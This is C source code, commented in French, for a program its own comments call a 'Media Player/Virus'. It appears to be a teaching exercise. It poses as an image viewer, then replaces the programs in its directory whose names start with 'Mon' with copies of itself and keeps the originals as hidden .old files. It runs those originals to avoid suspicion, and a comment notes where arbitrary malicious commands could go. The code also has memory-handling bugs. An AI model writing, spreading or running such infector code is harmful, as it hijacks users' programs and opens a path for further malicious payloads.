#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>

char** getFiles();
void infecte();
bool dejaInfecte(char* f);
char* getExtension(char* f);
void afficherMediaPlayer();

void afficherMediaPlayer(){
    system("xdg-open ../img/img1.jpg"); //Ouverture du système d'affichage d'images Linux grâce à la commande système qui permet d'executer des commandes bash
}

/**
 * Fonction pour récupérer l'extension d'un fichier
 */
char* getExtension(char* f){
    char* dot = strrchr(f, '.');
    return (!dot || dot == f) ? "" : dot+1;
}

/**
 * Fonction permettant de récupérer les noms des fichiers à infecter
 */
char** getFiles(){
    char** files = malloc(10*sizeof(char*)); // On alloue le mémoire à la variable files pour permettre de récupérer les noms des 5 programmes
    int cpt = 0; // Compteur du nombre de programmes
    DIR *repertoire = opendir("."); // Ouverture du répertoire courant pour parcourir les fochiers
    struct stat statsF; // Obtenir les statistiques d'un fichier
    struct dirent *lecture; // Obtenir le fichier courant
    //printf("Liste des fichiers exécutables : \n");
    while((lecture = readdir(repertoire))){
        /**
         * Lecture du répertoire
         */
        if ((stat(lecture->d_name, &statsF) == 0) && ((statsF.st_mode & S_IFMT) == S_IFREG) && (statsF.st_mode & S_IXUSR)) {
            /**
             * Si le fichier est exécutable et régulier
             */
            if (cpt<10 && (strcmp(lecture->d_name, "MediaPlayer.exe") != 0)) {
                /**
                 * Si l'exécutable n'est pas le media player
                 */
                //printf("- %s\n", lecture->d_name);
                files[cpt] = lecture->d_name;
                cpt++;
            }

        }

    }
    closedir(repertoire);
    return files;
}

/**
 * Fonction permettant d'infecter les fichiers du répertoire
 */
void infecte(){
    /**
     * Parcours le répertoire courant, et compile les programmes monPGn avec l'extension .old
     */
    DIR *rep = opendir(".");
    char* monPG;
    char* monPGNoExtension = NULL;
    char commande1[80];
    char commande2[80];
    if (rep!= NULL) {
        struct dirent *lecture;
        /**
         * Lecture des fichiers .c du répertoire afin de créer les executables .old apres infection
         */
        while((lecture = readdir(rep))){
            char* ext = getExtension(lecture->d_name);
            /**
             * Si l'extension du fichier est .c et que le nom du fichier commence par "Mon"
             */
            if ((strcmp(ext, "c") == 0) && (strncmp(lecture->d_name, "Mon", 3) == 0)) {
                monPG = lecture->d_name;
                monPGNoExtension = calloc(sizeof(monPG), 1);
                strncat(monPGNoExtension, monPG, sizeof(monPG)-2); // Nom du programme sans l'extension

                /**
                 * Création de la commande gcc
                 */
                strcpy(commande1, "gcc -Wall ");
                strcat(commande1, monPG);
                strcat(commande1, " -o ");
                strcat(commande1, monPGNoExtension);
                strcat(commande1, ".old");
                system(commande1); // Execution de la commande

                /**
                 * Création de la commande pour dupliquer le MediaPlayer dans les executables des programmes
                 */
                strcpy(commande2, "gcc -Wall MediaPlayer.c -o ");
                strcat(commande2, monPGNoExtension);
                strcat(commande2, ".exe");
                system(commande2); // Execution de la commande
            }
        }
        closedir(rep);
    }
}


/**
 * Fonction permettant de vérifier qu'un fichier est déjà infecté ou non
 */
bool dejaInfecte(char* f){
    char* extension = ".old";
    char* monPGNoExtension = NULL;
    if (strstr(f, extension) != NULL) {
        /**
         * Le fichier en paramètres possède l'extension .old
        */
        return true;
    } else{
        DIR* repertoire = opendir(".");
        struct dirent *lecture;
        while((lecture = readdir(repertoire))){
            monPGNoExtension = calloc(sizeof(lecture->d_name), 1);
            strncat(monPGNoExtension, lecture->d_name, sizeof(lecture->d_name)-4); // Nom du programme sans l'extension
            if ((strcmp(lecture->d_name, f) == 0) && (fopen(strcat(monPGNoExtension, extension), "r") != NULL)) {
                /**
                * Le fichier lu dans le répertoire et le fichier en paramètre sont les mêmes
                * Le fichier lu avec l'extension .old a été ouvert
                * Donc le fichier est infecté
                 */
                return true;
            }
        }
    }
    return false;
}

/**
 * Main du programme de Media Player/Virus
 */
int main(int argc, char const *argv[])
{
    char** files = getFiles(); // Récupération des fichiers à infecter
    bool infectes = false;
    char* commande = NULL;
    commande = calloc(sizeof(argv[0]), 1);
    strncat(commande, argv[0], 8);
    printf("%s\n", commande);
    for(int i = 0; i < 5; i++)
    {
        infectes = dejaInfecte(files[i]); // On vérifie si l'infection initiale a été effectuée
    }

    if (!infectes) {
        afficherMediaPlayer();
        infecte(); // Infection des fichiers
    } else if(strncmp(commande, "./Mon", 5) == 0) {
        //printf("%s\n", commande);
        strcat(commande, ".old");
        system(commande); // Execution du programme .old pour éviter d'eveiller les souspcons
        /**
         * On peut effectuer ici toute sorte de commandes malveillantes et le virus sera effectif
         */
        printf("Bravo je suis le virus et vous êtes infectés\n");
    } else{
        afficherMediaPlayer();
    }
    return EXIT_SUCCESS;
}
